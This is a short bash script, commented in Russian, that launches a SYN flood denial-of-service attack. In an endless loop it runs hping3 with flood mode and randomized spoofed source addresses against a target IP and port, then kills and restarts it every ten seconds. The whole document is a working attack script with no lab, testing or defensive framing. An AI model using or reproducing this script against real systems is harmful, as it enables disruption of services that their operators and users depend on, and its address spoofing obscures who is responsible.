#!/bin/bash

echo "Starting SYN flood attack..."
echo "Target: $TARGET_IP:$TARGET_PORT"

# SYN flood атака с помощью hping3
while true; do
    hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    sleep 1
    # Убиваем процесс через 10 секунд и перезапускаем
    sleep 10
    pkill hping3
done 